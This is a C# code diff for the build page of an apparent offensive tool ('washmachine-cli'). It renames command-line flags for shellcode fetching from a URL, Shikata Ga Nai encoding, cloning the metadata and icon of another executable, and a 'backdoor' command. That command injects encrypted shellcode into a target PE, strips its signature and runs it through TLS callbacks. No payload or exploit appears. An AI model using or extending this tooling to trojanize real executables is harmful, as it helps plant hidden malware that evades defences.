@@ -858,7 +858,7 @@ public sealed partial class CompilePage : Page
                     _logger.Error("Shellcode URL is empty.");
                     return (null, false);
                 }
-                args.AddRange(["--shellcode-url", url]);
+                args.AddRange(["-ShellcodeUrl", url]);
                 break;
 
             default:
@@ -883,10 +883,10 @@ public sealed partial class CompilePage : Page
 
         if (mainPage.IsShikataGaNaiEnabled)
         {
-            args.Add("--shikata-ga-nai");
-            args.AddRange(["--shikata-enc", mainPage.ShikataGaNaiEncodeCount.ToString()]);
-            args.AddRange(["--shikata-max", mainPage.ShikataGaNaiMaxBytes.ToString()]);
-            args.AddRange(["--sgn-placement", mainPage.ShikataGaNaiPlacement]);
+            args.Add("-Sgn");
+            args.AddRange(["-SgnCount", mainPage.ShikataGaNaiEncodeCount.ToString()]);
+            args.AddRange(["-SgnMax", mainPage.ShikataGaNaiMaxBytes.ToString()]);
+            args.AddRange(["-SgnPlacement", mainPage.ShikataGaNaiPlacement]);
         }
 
         // Snippets — read from coordinator's template options (combos live in the dialog, not the visual tree)
@@ -895,7 +895,7 @@ public sealed partial class CompilePage : Page
         {
             if (!string.IsNullOrEmpty(value))
             {
-                args.AddRange(["--snippet", $"{key}={value}"]);
+                args.AddRange(["-Snippet", $"{key}={value}"]);
                 _logger.Debug($"[ui] snippet combo: {key}={value}");
             }
         }
@@ -903,7 +903,7 @@ public sealed partial class CompilePage : Page
         {
             if (values is { Count: > 0 })
             {
-                args.AddRange(["--snippet", $"{key}={string.Join(",", values)}"]);
+                args.AddRange(["-Snippet", $"{key}={string.Join(",", values)}"]);
                 _logger.Debug($"[ui] snippet list: {key}={string.Join(",", values)}");
             }
         }
@@ -911,7 +911,7 @@ public sealed partial class CompilePage : Page
         {
             if (!string.IsNullOrEmpty(value))
             {
-                args.AddRange(["--text", $"{key}={value}"]);
+                args.AddRange(["-Text", $"{key}={value}"]);
                 _logger.Debug($"[ui] text: {key}={value}");
             }
         }
@@ -920,24 +920,24 @@ public sealed partial class CompilePage : Page
         {
             if (finalizePage.IsCloneEnabled && !string.IsNullOrWhiteSpace(finalizePage.CloneSourceExePath))
             {
-                args.AddRange(["--clone-from", finalizePage.CloneSourceExePath]);
-                args.Add(finalizePage.CloneResources ? "--clone-resources" : "--no-clone-resources");
-                args.Add(finalizePage.CloneIcon ? "--clone-icon" : "--no-clone-icon");
-                args.Add(finalizePage.CloneMetadata ? "--clone-metadata" : "--no-clone-metadata");
+                args.AddRange(["-CloneFrom", finalizePage.CloneSourceExePath]);
+                args.Add(finalizePage.CloneResources ? "-CloneResources" : "-NoCloneResources");
+                args.Add(finalizePage.CloneIcon ? "-CloneIcon" : "-NoCloneIcon");
+                args.Add(finalizePage.CloneMetadata ? "-CloneMetadata" : "-NoCloneMetadata");
             }
 
             if (finalizePage.NopPaddingBytes > 0)
             {
-                args.AddRange(["--pad-nops", finalizePage.NopPaddingBytes.ToString()]);
+                args.AddRange(["-PadNops", finalizePage.NopPaddingBytes.ToString()]);
             }
         }
 
         // Verbose output
         if (VerboseBuildCheck.IsChecked == true)
-            args.Add("--verbose");
+            args.Add("-Verbose");
 
         // JSON output for machine-readable result
-        args.Add("--json");
+        args.Add("-Json");
 
         _logger.Info($"CLI: washmachine-cli {string.Join(" ", args.Select(a => a.Contains(' ') ? $"\"{a}\"" : a))}");
 
@@ -1118,9 +1118,9 @@ public sealed partial class CompilePage : Page
         var args = new List<string>
         {
             "strip",
-            compiledExe,
-            "-o", outBin,
-            "--mode", "ep",
+            "-Pe", compiledExe,
+            "-Output", outBin,
+            "-Mode", "ep",
         };
 
         var result = await _cli.RunAsync(args, line => _logger.Info(line));
@@ -1167,9 +1167,9 @@ public sealed partial class CompilePage : Page
         var args = new List<string>
         {
             "backdoor",
-            "--pe",        targetPe,
-            "--shellcode", shellcodeBinPath,
-            "--output",    outFile,
+            "-Pe",        targetPe,
+            "-Shellcode", shellcodeBinPath,
+            "-Output",    outFile,
         };
 
         // Pass GUI-selected options to CLI
@@ -1180,16 +1180,16 @@ public sealed partial class CompilePage : Page
             InjectionMethod.SectionExtension => "section-ext",
             _ => "code-cave"
         };
-        args.AddRange(new[] { "--method", method });
+        args.AddRange(new[] { "-Method", method });
 
         if (!backdoorPage.RemoveSignature)
-            args.Add("--no-remove-sig");
+            args.Add("-NoRemoveSig");
         if (!backdoorPage.PatchSubsystemToGui)
-            args.Add("--no-patch-subsystem");
+            args.Add("-NoPatchSubsystem");
         if (!backdoorPage.PreserveOriginalEntry)
-            args.Add("--no-preserve-entry");
+            args.Add("-NoPreserveEntry");
         if (!backdoorPage.PatchIat)
-            args.Add("--no-patch-iat");
+            args.Add("-NoPatchIat");
 
         // Carrier invoke method
         var carrierStr = backdoorPage.SelectedCarrierInvoke switch
@@ -1199,7 +1199,7 @@ public sealed partial class CompilePage : Page
             CarrierInvoke.TlsCallback => "tls",
             _ => "entry-point"
         };
-        args.AddRange(new[] { "--carrier", carrierStr });
+        args.AddRange(new[] { "-Carrier", carrierStr });
 
         // Encryption
         if (backdoorPage.SelectedEncryption != PayloadEncryption.None)
@@ -1211,26 +1211,26 @@ public sealed partial class CompilePage : Page
                 PayloadEncryption.Rc4  => "rc4",
                 _                      => "none"
             };
-            args.AddRange(["--encryption", encStr]);
+            args.AddRange(["-Encryption", encStr]);
             if (backdoorPage.XorKey is { } xorKey)
-                args.AddRange(["--xor-key", xorKey]);
+                args.AddRange(["-XorKey", xorKey]);
         }
 
         // Patch-exit
         if (!backdoorPage.PatchExit)
-            args.Add("--no-patch-exit");
+            args.Add("-NoPatchExit");
 
         // Section name
         if (backdoorPage.CustomSectionName is { } sectionName)
-            args.AddRange(["--section-name", sectionName]);
+            args.AddRange(["-SectionName", sectionName]);
 
         // Cave min size
         if (backdoorPage.CaveMinSize != 64)
-            args.AddRange(["--cave-min-size", backdoorPage.CaveMinSize.ToString()]);
+            args.AddRange(["-CaveMinSize", backdoorPage.CaveMinSize.ToString()]);
 
         // Dry run
         if (backdoorPage.DryRun)
-            args.Add("--dry-run");
+            args.Add("-DryRun");
 
         var result = await _cli.RunAsync(args, line => _logger.Info(line));
 
